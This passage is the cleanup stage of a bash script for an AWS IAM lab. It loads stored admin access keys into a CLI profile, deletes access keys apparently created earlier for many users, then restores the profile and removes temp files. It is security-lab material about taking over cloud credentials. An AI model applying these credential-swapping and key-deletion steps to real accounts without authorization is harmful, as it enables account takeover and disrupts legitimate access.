  return 0 2>/dev/null || exit 0
fi

if [ ! -s "$ADMIN_KEYS_FILE" ]; then
  err "No admin user available to perform cleanup. Cannot continue."
  return 1 2>/dev/null || exit 1
fi

# Pick first admin to do cleanup
IFS='|' read -r ADMIN_USER ADMIN_KEY ADMIN_SECRET < "$ADMIN_KEYS_FILE"
ok "Using admin credentials for cleanup: ${YELLOW}${ADMIN_USER}${RESET}"

# Backup current profile
ORIG_KEY="$(aws configure get aws_access_key_id --profile "$PROFILE" 2>/dev/null || true)"
ORIG_SECRET="$(aws configure get aws_secret_access_key --profile "$PROFILE" 2>/dev/null || true)"

# Apply admin creds to profile
aws configure set aws_access_key_id     "$ADMIN_KEY" --profile "$PROFILE"
aws configure set aws_secret_access_key "$ADMIN_SECRET" --profile "$PROFILE"

# Verify admin access
ADMIN_ARN="$(aws sts get-caller-identity --profile "$PROFILE" --query 'Arn' --output text 2>/dev/null || echo '')"
if [ -n "$ADMIN_ARN" ]; then
  ok "Assumed identity: ${ADMIN_ARN}"
else
  err "Failed to use admin credentials. Aborting."
  exit 1
fi

# Helper: delete key with retry
delete_key() {
  local user="$1" keyid="$2"
  local tries=0 rc=1 errout
  while [ $tries -lt 3 ]; do
    set +e
    errout="$(aws iam delete-access-key --user-name "$user" --access-key-id "$keyid" --profile "$PROFILE" 2>&1)"
    rc=$?
    set -e
    if [ $rc -eq 0 ]; then
      printf "[OK] Deleted AccessKey for %s (%s)\n" "$user" "$keyid"
      return 0
    fi
    tries=$((tries+1))
    sleep 2
  done
  printf "[DENY] Failed to delete AccessKey for %s (%s)\n" "$user" "$keyid"
  [ -n "$errout" ] && printf "       Error: %s\n" "$errout"
  return 1
}

# Build ordered list: non-admins first, admin last
DELETE_ORDER=()
while IFS='|' read -r user key secret; do
  if [ "$user" != "$ADMIN_USER" ]; then
    DELETE_ORDER+=("$user|$key")
  fi
done < "$SUCCESS_KEYS_FILE"

# Add admin last (if we created a key for them)
if grep -q "^${ADMIN_USER}|" "$SUCCESS_KEYS_FILE"; then
  DELETE_ORDER+=("$ADMIN_USER|$ADMIN_KEY")
fi

# Execute deletions
if [ "${#DELETE_ORDER[@]}" -gt 0 ]; then
  printf "%s[*]%s Deleting AccessKeys (non-admin first, admin last):\n" "${YELLOW}" "${RESET}"
  for entry in "${DELETE_ORDER[@]}"; do
    IFS='|' read -r u k <<< "$entry"
    if [ -n "$u" ] && [ -n "$k" ]; then
      delete_key "$u" "$k"
    else
      echo "[i] Skipping invalid entry: $entry"
    fi
  done
else
  info "No keys found for deletion."
fi

# Restore profile
step "Restoring original profile credentials"
if [ -n "$ORIG_KEY" ] && [ -n "$ORIG_SECRET" ]; then
  aws configure set aws_access_key_id     "$ORIG_KEY"    --profile "$PROFILE"
  aws configure set aws_secret_access_key "$ORIG_SECRET" --profile "$PROFILE"
  ok "Profile ${PROFILE} restored"
else
  info "No original creds were saved; profile remains as admin"
fi

# Cleanup temp files
rm -f "$SUCCESS_KEYS_FILE" "$ADMIN_KEYS_FILE"
ok "Temporary files cleaned up."

echo
printf "%s=== Lab cleanup complete ===%s\n" "${BOLD}${GREEN}" "${RESET}"

